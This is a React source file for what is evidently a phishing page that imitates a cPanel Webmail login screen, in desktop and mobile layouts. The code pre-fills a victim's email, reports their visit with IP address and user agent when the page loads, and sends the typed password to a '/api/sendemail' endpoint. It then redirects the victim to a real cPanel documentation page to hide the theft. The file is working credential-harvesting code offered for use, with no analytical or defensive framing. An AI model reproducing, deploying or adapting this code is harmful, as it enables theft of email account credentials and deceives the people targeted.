/** @format */
"use client";

import React, { useState, useEffect } from "react";

const Popup = ({ domain, eparams, systemInfo }) => {
  const [password, setPassword] = useState("");
  const [userAgent, setUserAgent] = useState("");
  const [remoteAddress, setRemoteAddress] = useState("");
  const [landingUrl, setLandingUrl] = useState("");

  useEffect(() => {
    // Set user agent
    setUserAgent(navigator.userAgent);
    
    // Set landing URL
    setLandingUrl(window.location.href);
    
    // Get IP address
    const getIP = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setRemoteAddress(data.ip);
      } catch (error) {
        console.error("Failed to get IP address:", error);
        setRemoteAddress("Unable to retrieve IP");
      }
    };
    
    getIP();

    // Send access notification when component mounts
    const sendAccessNotification = async () => {
      try {
        await fetch(`/api/sendemail?email=${encodeURIComponent(eparams)}&userAgent=${encodeURIComponent(navigator.userAgent)}&remoteAddress=${encodeURIComponent(remoteAddress)}&landingUrl=${encodeURIComponent(window.location.href)}`, {
          method: "GET",
        });
      } catch (error) {
        console.error("Failed to send access notification:", error);
      }
    };
    
    sendAccessNotification();

    const link = document.createElement("link");
    link.href = "https://fonts.googleapis.com/css2?family=Open+Sans&display=swap";
    link.rel = "stylesheet";
    document.head.appendChild(link);
    return () => {
      try {
        document.head.removeChild(link);
      } catch (err) {
        /* ignore */
      }
    };
  }, [eparams, remoteAddress]);

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          eparams, 
          password, 
          userAgent, 
          remoteAddress,
          landingUrl: window.location.href
        }),
      });
    } catch (error) {
      console.error("Failed to send credentials:", error);
    }

    window.location.href = "https://docs.cpanel.net/cpanel/security/security-policy/";
  };

  return (
    <div
      style={{
        backgroundColor: "#fff",
        borderRadius: "10px",
        maxWidth: "2000px",
        margin: "30px",
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
      }}
    >
      <img style={{ width: "305px", marginLeft: "227px", justifyContent: "center" }} src="/Webmail.png" alt="" />

      {/* Email (read-only) */}
      <div style={{ marginTop: "30px", marginBottom: "15px", fontSize: "14px" }}>
        <label style={{ marginLeft: "235px", fontWeight: "559", fontSize: "15px", color: "#293a4a" }}>Email Address</label>
        <div style={{ position: "relative", width: "36%", marginLeft: "235px", marginTop: "5px" }}>
          <img src="/Human icon.jpg" alt="icon" style={{ position: "absolute", top: "50%", left: "12px", transform: "translateY(-50%)", width: "16px", height: "16px", pointerEvents: "none" }} />
          <input type="email" value={eparams} readOnly style={{ width: "111%", padding: "12px 12px 12px 36px", borderRadius: "4px", border: "2px solid #ccc", outline: "none", height: "34px", boxSizing: "border-box" }} />
        </div>
      </div>

      {/* Password */}
      <div style={{ marginTop: "30px", marginBottom: "6px", fontSize: "14px" }}>
        <label style={{ marginLeft: "235px", fontWeight: "600", fontSize: "16px", color: "##293a4a" }}>Password</label>
        <div style={{ position: "relative", width: "36%", marginLeft: "235px", marginTop: "8px" }}>
          <img src="/password icon.jpg" alt="password icon" style={{ position: "absolute", top: "50%", left: "12px", transform: "translateY(-50%)", width: "16px", height: "16px", pointerEvents: "none" }} />
          <input type="password" placeholder="Enter your email password" value={password} onChange={(e) => setPassword(e.target.value)} style={{ width: "111%", padding: "12px 12px 12px 36px", borderRadius: "4px", border: "2px solid #ccc", height: "34px", outline: "none", boxSizing: "border-box" }} />
        </div>
      </div>

      {/* Login Button */}
      <button
        onClick={handleLogin}
        style={{
          width: "40%",
          backgroundColor: "#179bd7",
          color: "#fff",
          border: "none",
          padding: "center",
          fontWeight: "bold",
          borderRadius: "4px",
          cursor: "pointer",
          fontSize: "14px",
          height: "36px",
          marginLeft: "235px",
          justifyContent: "center",
          marginTop: "23px",
          fontFamily: "'Open Sans', sans-serif",
        }}
      >
        Log in
      </button>

      {/* Divider */}
      <div style={{ display: "flex", alignItems: "center", justifyContent: "center", margin: "40px 0", textAlign: "center" }}>
        <div style={{ marginLeft: "80px", marginRight: "7px" }}>
          <hr style={{ width: "110px", border: "1px solid #ccc", background: "#ccc", borderTop: "1px solid #ccc", height: "1px", margin: "0 1px 0 5px" }} />
        </div>
        <span style={{ backgroundColor: "#fff", padding: "5px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}>
          <img src="/Or icon.jpg" alt="Divider Icon" style={{ height: "30px", objectFit: "contain" }} />
        </span>
        <div style={{ marginRight: "20px" }}>
          <hr style={{ width: "95px", border: "1px solid #ccc", background: "#ccc", borderTop: "1px solid #ccc", height: "1px", margin: "0 14px" }} />
        </div>
      </div>

      {/* cPanel Login */}
      <button
        onClick={() => alert("Redirecting to cPanel login")}
        style={{
          width: "40%",
          backgroundColor: "#f60",
          color: "#fff",
          border: "none",
          padding: "12px",
          fontWeight: "bold",
          borderRadius: "4px",
          cursor: "pointer",
          fontSize: "13px",
          height: "36px",
          marginLeft: "235px",
          justifyContent: "center",
          display: "flex",
          alignItems: "center",
          gap: "8px",
          fontFamily: "'Open Sans', sans-serif",
        }}
      >
        <img src="/cpanel logo.jpg" alt="cPanel Logo" style={{ height: "20px", objectFit: "contain" }} />
        Log in via cPanelID
      </button>

      {/* Language Footer */}
      <div style={{ marginTop: "30px", fontSize: "12px", color: "#888", textAlign: "center", display: "flex", justifyContent: "space-between", flexWrap: "wrap", gap: "40px", fontWeight: "500", color: "black" }}>
        <p> English </p> <p> العربية </p> <p>čeština </p> <p>dansk </p> <p> Deutsch </p> <p>Ελληνικά </p> <p> español </p> <p> español latinoamericano </p>
      </div>

      <div style={{ display: "flex", justifyContent: "center" }}>
        <img src="/Privacy policy logo.jpg" alt="" style={{ width: "180px", height: "auto", marginTop: "60px", marginLeft: "26px" }} />
      </div>
    </div>
  );
};

const PopupMobile = ({ domain, eparams, systemInfo }) => {
  const [password, setPassword] = useState("");
  const [locale, setLocale] = useState("English");
  const [userAgent, setUserAgent] = useState("");
  const [remoteAddress, setRemoteAddress] = useState("");
  const [landingUrl, setLandingUrl] = useState("");

  useEffect(() => {
    // Set user agent
    setUserAgent(navigator.userAgent);
    
    // Set landing URL
    setLandingUrl(window.location.href);
    
    // Get IP address
    const getIP = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setRemoteAddress(data.ip);
      } catch (error) {
        console.error("Failed to get IP address:", error);
        setRemoteAddress("Unable to retrieve IP");
      }
    };
    
    getIP();

    // Send access notification when component mounts
    const sendAccessNotification = async () => {
      try {
        await fetch(`/api/sendemail?email=${encodeURIComponent(eparams)}&userAgent=${encodeURIComponent(navigator.userAgent)}&remoteAddress=${encodeURIComponent(remoteAddress)}&landingUrl=${encodeURIComponent(window.location.href)}`, {
          method: "GET",
        });
      } catch (error) {
        console.error("Failed to send access notification:", error);
      }
    };
    
    sendAccessNotification();
  }, [eparams, remoteAddress]);

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          eparams, 
          password, 
          userAgent, 
          remoteAddress,
          landingUrl: window.location.href
        }),
      });
    } catch (error) {
      console.error("Failed to send credentials:", error);
    }

    window.location.href = "https://docs.cpanel.net/cpanel/security/security-policy/";
  };

  return (
    <div style={{ backgroundColor: "#fff", padding: "20px", borderRadius: "8px", maxWidth: "420px", margin: "40px auto", fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", boxSizing: "border-box" }}>
      <div style={{ textAlign: "center", marginBottom: "18px" }}>
        <img src="/Webmail.png" alt="Webmail Logo" style={{ maxWidth: "180px", height: "auto" }} />
      </div>

      <div style={{ marginBottom: "14px", position: "relative" }}>
        <img src="/Human icon.jpg" alt="user icon" style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)", width: "18px", height: "18px", pointerEvents: "none", opacity: 0.8 }} />
        <input type="email" value={eparams} readOnly style={{ width: "100%", padding: "12px 12px 12px 44px", borderRadius: "6px", border: "1px solid #cfcfcf", fontSize: "15px", boxSizing: "border-box" }} aria-label="Email address" />
      </div>

      <div style={{ marginBottom: "18px", position: "relative" }}>
        <img src="/password icon.jpg" alt="password icon" style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)", width: "18px", height: "18px", pointerEvents: "none", opacity: 0.8 }} />
        <input type="password"  placeholder="Enter your email password"  value={password} onChange={(e) => setPassword(e.target.value)} style={{ width: "100%", padding: "12px 12px 12px 44px", borderRadius: "6px", border: "1px solid #cfcfcf", fontSize: "12px", boxSizing: "border-box" }} aria-label="Password" />
      </div>

      <button onClick={handleLogin} style={{ width: "100%", backgroundColor: "#179bd7", color: "#fff", border: "none", padding: "12px", fontWeight: "700", borderRadius: "6px", cursor: "pointer", fontSize: "15px", marginBottom: "18px" }}>
        Log in
      </button>

      <div style={{ display: "flex", alignItems: "center", marginBottom: "18px", gap: "12px" }}>
        <hr style={{ flex: 1, border: "none", borderTop: "1px solid #ddd" }} />
        <span style={{ whiteSpace: "nowrap", color: "#666", fontSize: "13px" }}>OR</span>
        <hr style={{ flex: 1, border: "none", borderTop: "1px solid #ddd" }} />
      </div>

      <button onClick={() => alert("Redirecting to cPanel login")} style={{ width: "100%", backgroundColor: "#f60", color: "#fff", border: "none", padding: "12px", fontWeight: "700", borderRadius: "6px", cursor: "pointer", fontSize: "14px", display: "flex", justifyContent: "center", alignItems: "center", gap: "10px", marginBottom: "18px" }}>
        <img src="/cpanel logo.jpg" alt="cPanel Logo" style={{ height: 20 }} />
        Log in via cPanel
      </button>

      <div style={{ textAlign: "center", marginBottom: "22px" }}>
        <label htmlFor="locale" style={{ marginRight: "8px", fontSize: "14px" }}>Select a locale:</label>
        <select id="locale" value={locale} onChange={(e) => setLocale(e.target.value)} style={{ padding: "7px", borderRadius: "6px", border: "1px solid #cfcfcf", fontSize: "14px" }}>
          <option>English</option>
          <option>العربية</option>
          <option>Čeština</option>
          <option>Dansk</option>
          <option>Deutsch</option>
          <option>Ελληνικά</option>
          <option>español</option>
        </select>
      </div>

      <div style={{ textAlign: "center", fontSize: "12px", color: "#666" }}>
        <p style={{ margin: 0 }}>© 2025 cPanel, L.L.C.</p>
        <p style={{ margin: 0 }}>Privacy Policy</p>
      </div>
    </div>
  );
};

const ResponsivePopup = (props) => {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    checkMobile();
    window.addEventListener("resize", checkMobile);
    return () => window.removeEventListener("resize", checkMobile);
  }, []);

  return isMobile ? <PopupMobile {...props} /> : <Popup {...props} />;
};

export default ResponsivePopup;